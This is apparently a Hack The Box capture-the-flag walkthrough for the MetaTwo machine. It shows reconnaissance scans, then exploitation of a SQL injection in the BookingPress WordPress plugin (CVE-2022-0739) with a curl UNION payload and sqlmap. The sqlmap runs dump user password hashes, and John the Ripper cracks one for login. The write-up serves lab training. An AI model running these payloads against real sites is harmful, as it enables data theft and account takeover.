# Hack The Box - MetaTwo Walkthrough 

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.11.186
[sudo] password for darshan: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-13 09:01 EST
Nmap scan report for 10.10.11.186
Host is up (0.25s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)
|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)
|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/
|_http-server-header: nginx/1.18.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.92%I=7%D=2/13%Time=63EA42E2%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,8F,"220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10\
SF:.11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cre
SF:ative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative
SF:\r\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/13%OT=21%CT=1%CU=30499%PV=Y%DS=2%DC=I%G=Y%TM=63EA432
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST1
OS:1NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.51 seconds
```


So, we got back the results and `2` open ports while the rest are filtered.
- Port `21`: running `ftp`
- Port `22`: running `OpenSSH 8.4p1`
- Port `80`: runninng `nginx 1.18.0`
 

Before starting enumeration, I ran a more comprehensive scan in the background to make sure that I did not miss anything.
So I ran `Rustscan` that covers all ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
└─$ rustscan -a 10.10.11.186 --range 1-65535        
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.186:21
Open 10.10.11.186:22
Open 10.10.11.186:80
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 21,22,80 10.10.11.186

Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-13 09:14 EST
Initiating Ping Scan at 09:14
Scanning 10.10.11.186 [2 ports]
Completed Ping Scan at 09:14, 0.24s elapsed (1 total hosts)
Initiating Connect Scan at 09:14
Scanning metapress.htb (10.10.11.186) [3 ports]
Discovered open port 80/tcp on 10.10.11.186
Discovered open port 22/tcp on 10.10.11.186
Discovered open port 21/tcp on 10.10.11.186
Completed Connect Scan at 09:14, 0.23s elapsed (3 total ports)
Nmap scan report for metapress.htb (10.10.11.186)
Host is up, received conn-refused (0.23s latency).
Scanned at 2023-02-13 09:14:00 EST for 1s

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.51 seconds
```

So, now that it was confirmed that only 3 ports were open, I could move on with the enumeration.

## Enumeration
Firstly, as `nmap` results showed that on port `80`, I was being redirected to `http://metapress.htb`, I decided to add the host to `/etc/hosts`

```
sudo echo "10.10.11.196  metapress.htb" >> /etc/hosts
```

I tried to ping it, to see if its working and it is working.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
└─$ ping -c 1 metapress.htb
PING metapress.htb (10.10.11.186) 56(84) bytes of data.
64 bytes from metapress.htb (10.10.11.186): icmp_seq=1 ttl=63 time=239 ms

--- metapress.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 239.358/239.358/239.358/0.000 ms
```

Now I used `whatweb` to look at what services were running on the web-page.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
└─$ whatweb http://metapress.htb             
http://metapress.htb [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], IP[10.10.11.186], MetaGenerator[WordPress 5.6.2], PHP[8.0.24], PoweredBy[--], Script, Title[MetaPress &#8211; Official company site], UncommonHeaders[link], WordPress[5.6.2], X-Powered-By[PHP/8.0.24], nginx[1.18.0]
```

Then, I visited the web-page.

![meta-1](https://user-images.githubusercontent.com/87711310/218543511-90c4b5f9-3a83-4faa-a58a-22bb47a9a64c.png)


Using `Wappalyzer` on the weebsite, I found that it was using `WordPress 5.6.2`.

![meta-2](https://user-images.githubusercontent.com/87711310/218543523-a0e23e52-770c-4c59-8c07-092ac338742d.png)


There was also a page `/events`, which allowed to book a 30 minutes meetings at my preferred time and date.

![meta-3](https://user-images.githubusercontent.com/87711310/218543540-7410c3b5-3fc7-4ef0-9770-d33be5e3d3c5.png)


Once I booked the meeting with some sample data, I found the URL using a `appointment_id` paramater.

![meta-4](https://user-images.githubusercontent.com/87711310/218543566-aa014431-d3f6-46f9-8ab8-824c307462d3.png)


On closely looking at the value of the `parameter_id`, it seemed like a `base64` encoded value, so I decided to decode it and look what is it's value.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
└─$ echo "MQ==" |base64 -d                                     
1
```

It looked suspicious, so I tried injecting other values to see if it was vulnerable but it was not!!!

Looking at the `source-code`, I found a `wp-admin` directory, and all found out that the web-site was using `Booking Press v1.0.10`. So, I decided to check of any exploit for that particular application exists.

![meta-5](https://user-images.githubusercontent.com/87711310/218543582-634e61c2-fdd1-4908-8c2b-995ef6c01b8f.png)


On googling it, I found a recently discovered Booking press vulnerability found in 2022, [CVE-2022-0739](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357)

![meta-6](https://user-images.githubusercontent.com/87711310/218543595-ee6f9417-0f7a-4ee1-9c52-ae0db76df30a.png)


For the exploit to work, we need some info about `_wpnonce` which can be found in events page source code.

![meta-7](https://user-images.githubusercontent.com/87711310/218543612-1f98dc4a-7ec4-4a8d-af43-006ce9a25a44.png)


Now, we have two options, the first one is to `dump the database manually` or use some automation tool like `sqlmap`. I am doing it with second option.

Before that, we'll need to retrieve tha value of `_wpnonce` parameter. For that, I used the payload mentioned in the CVE mentioned above.

```
curl -i 'https://example.com/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services&_wpnonce=8cc8b79544&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
```

Now, once you run the command, you'll get an error like shown below.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
└─$ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=8cc8b79544&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -' 
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Mon, 13 Feb 2023 15:06:20 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.24
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin

{"variant":"error","title":"Error","msg":"Sorry, Your request can not process due to security reason."}  
```

So, now, go to `/events` page and find the request from `admin-ajax.php` to retrieve the value of `_wpnonce` parameter.

![meta-8](https://user-images.githubusercontent.com/87711310/218543629-5f933219-0554-4210-aa58-f212e257100f.png)


Once the value is retrieved, replace that value in the request payload you previously sent.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
└─$ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Mon, 13 Feb 2023 15:10:19 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.24
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin

[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]                                                                                                                                                                                   
```

Once you hit send, you'll get a `200 OK` along with other data instead of an error received when you sent the previous payload.

Now, that we know that we got a `SQL Injection`, I switched to `sqlmap` to craft the payload.

```
sqlmap -u http://metapress.htb/wp-admin/admin-ajax.php --data 'action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1' -p total_service 
```


```SQL
┌──(darshan㉿kali)-[~]
└─$ sqlmap -u http://metapress.htb/wp-admin/admin-ajax.php --data 'action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1' -p total_service      
        ___
       __H__                                                                                                                                           
 ___ ___[.]_____ ___ ___  {1.7.2#stable}                                                                                                               
|_ -| . [']     | .'| . |                                                                                                                              
|___|_  [)]_|_|_|__,|  _|                                                                                                                              
      |_|V...       |_|   https://sqlmap.org                                                                                                           

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:43:24 /2023-02-13/

[10:43:24] [INFO] testing connection to the target URL
[10:43:24] [INFO] testing if the target URL content is stable
[10:43:24] [INFO] target URL content is stable
[10:43:25] [WARNING] heuristic (basic) test shows that POST parameter 'total_service' might not be injectable
[10:43:25] [INFO] testing for SQL injection on POST parameter 'total_service'
[10:43:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:43:26] [INFO] POST parameter 'total_service' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[10:43:27] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[10:43:33] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[10:43:33] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[10:43:34] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[10:43:34] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[10:43:34] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[10:43:34] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[10:43:34] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[10:43:35] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[10:43:35] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:43:35] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:43:35] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:43:36] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:43:36] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[10:43:36] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[10:43:36] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:43:37] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[10:43:37] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[10:43:37] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[10:43:37] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[10:43:37] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[10:43:37] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[10:43:37] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[10:43:37] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[10:43:37] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[10:43:37] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[10:43:37] [INFO] testing 'Generic inline queries'
[10:43:38] [INFO] testing 'MySQL inline queries'
[10:43:38] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[10:43:38] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[10:43:38] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[10:43:39] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[10:43:39] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[10:43:39] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[10:43:39] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:43:50] [INFO] POST parameter 'total_service' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[10:43:50] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[10:43:50] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[10:43:50] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[10:43:51] [INFO] target URL appears to have 9 columns in query
[10:43:52] [INFO] POST parameter 'total_service' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'total_service' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 48 HTTP(s) requests:
---
Parameter: total_service (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1) AND 1179=1179 AND (5714=5714

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1) AND (SELECT 3708 FROM (SELECT(SLEEP(5)))gLML) AND (2888=2888

    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1) UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7162717171,0x70536f744a6c56535468795050594841454258666b4a7a7257675a495659666d5a6b595466697348,0x71787a7671),NULL,NULL,NULL,NULL-- -
---
[10:43:54] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0, PHP 8.0.24
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[10:43:55] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/metapress.htb'

[*] ending @ 10:43:55 /2023-02-13/
```

So now that sqlmap knows that it is vulnerable I, further, enumerated the database.

```
sqlmap -u http://metapress.htb/wp-admin/admin-ajax.php --data 'action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1' -p total_service -- db
```

```
┌──(darshan㉿kali)-[~]
└─$ sqlmap -u http://metapress.htb/wp-admin/admin-ajax.php --data 'action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1' -p total_service -- db
        ___
       __H__                                                                                                                                           
 ___ ___[']_____ ___ ___  {1.7.2#stable}                                                                                                               
|_ -| . [']     | .'| . |                                                                                                                              
|___|_  [']_|_|_|__,|  _|                                                                                                                              
      |_|V...       |_|   https://sqlmap.org                                                                                                           

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:45:16 /2023-02-13/

[10:45:16] [INFO] resuming back-end DBMS 'mysql' 
[10:45:16] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: total_service (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1) AND 1179=1179 AND (5714=5714

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1) AND (SELECT 3708 FROM (SELECT(SLEEP(5)))gLML) AND (2888=2888

    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1) UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7162717171,0x70536f744a6c56535468795050594841454258666b4a7a7257675a495659666d5a6b595466697348,0x71787a7671),NULL,NULL,NULL,NULL-- -
---
[10:45:17] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.0.24, Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[10:45:17] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/metapress.htb'

[*] ending @ 10:45:17 /2023-02-13/
```

Dumping tables in the Database `blog`

```
sqlmap -u http://metapress.htb/wp-admin/admin-ajax.php --data 'action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1' -p total_service -D blog --tables
```

```
┌──(darshan㉿kali)-[~]
└─$ sqlmap -u http://metapress.htb/wp-admin/admin-ajax.php --data 'action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1' -p total_service -D blog --tables
        ___
       __H__                                                                                                                                           
 ___ ___[)]_____ ___ ___  {1.7.2#stable}                                                                                                               
|_ -| . [,]     | .'| . |                                                                                                                              
|___|_  [(]_|_|_|__,|  _|                                                                                                                              
      |_|V...       |_|   https://sqlmap.org                                                                                                           

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:46:23 /2023-02-13/

[10:46:23] [INFO] resuming back-end DBMS 'mysql' 
[10:46:23] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: total_service (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1) AND 1179=1179 AND (5714=5714

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1) AND (SELECT 3708 FROM (SELECT(SLEEP(5)))gLML) AND (2888=2888

    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1) UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7162717171,0x70536f744a6c56535468795050594841454258666b4a7a7257675a495659666d5a6b595466697348,0x71787a7671),NULL,NULL,NULL,NULL-- -
---
[10:46:24] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0, PHP 8.0.24
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[10:46:24] [INFO] fetching tables for database: 'blog'
Database: blog
[27 tables]
+--------------------------------------+
| wp_bookingpress_appointment_bookings |
| wp_bookingpress_categories           |
| wp_bookingpress_customers            |
| wp_bookingpress_customers_meta       |
| wp_bookingpress_customize_settings   |
| wp_bookingpress_debug_payment_log    |
| wp_bookingpress_default_daysoff      |
| wp_bookingpress_default_workhours    |
| wp_bookingpress_entries              |
| wp_bookingpress_form_fields          |
| wp_bookingpress_notifications        |
| wp_bookingpress_payment_logs         |
| wp_bookingpress_services             |
| wp_bookingpress_servicesmeta         |
| wp_bookingpress_settings             |
| wp_commentmeta                       |
| wp_comments                          |
| wp_links                             |
| wp_options                           |
| wp_postmeta                          |
| wp_posts                             |
| wp_term_relationships                |
| wp_term_taxonomy                     |
| wp_termmeta                          |
| wp_terms                             |
| wp_usermeta                          |
| wp_users                             |
+--------------------------------------+

[10:46:24] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/metapress.htb'

[*] ending @ 10:46:24 /2023-02-13/


```

Dumping `wp_users` tables data

```
sqlmap -u http://metapress.htb/wp-admin/admin-ajax.php --data 'action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1' -p total_service -D blog -T wp_users --dump
```

```
Database: blog
Table: wp_users
[2 entries]
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| ID | user_url             | user_pass                          | user_email            | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| 1  | http://metapress.htb | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb   | admin      | 0           | admin        | admin         | 2022-06-23 17:58:28 | <blank>             |
| 2  | <blank>              | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | manager    | 0           | manager      | manager       | 2022-06-23 18:07:55 | <blank>             |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+

[11:15:30] [INFO] table 'blog.wp_users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/metapress.htb/dump/blog/wp_users.csv'
[11:15:30] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/metapress.htb'
```

Now, I found 2 users: `admin` & `manager` and got their password hashes too.

So, i decided to use `John the ripper` to crack the password

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
└─$ cat hash 
$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70


┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
└─$ john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
partylikearockstar (?)     
1g 0:00:02:56 34.59% (ETA: 13:20:51) 0.005666g/s 28927p/s 29553c/s 29553C/s nibbles1001..niavillegas
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session aborted

```

So, john was able to crack one hash and was taking too much time to crack another, which I guess was intentionally an uncrackable hash given to us.

So, the cracked hash belonged to the user `manager`.

So, now, I tried to login through `ftp` using creds `manager:` but it didnt work

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
└─$ ftp ftp://manager:partylikearockstar@10.10.11.186
Connected to 10.10.11.186.
220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
331 Password required for manager
530 Login incorrect.
ftp: Login failed
ftp: Can't connect or login to host `10.10.11.186:ftp'
221 Goodbye.
```

So, now, my only option left was try it on the `/wp-login.php` login page.

![meta-9](https://user-images.githubusercontent.com/87711310/218543662-d2364f01-0077-4a19-97d8-344fc792569e.png)

And it worked!!!


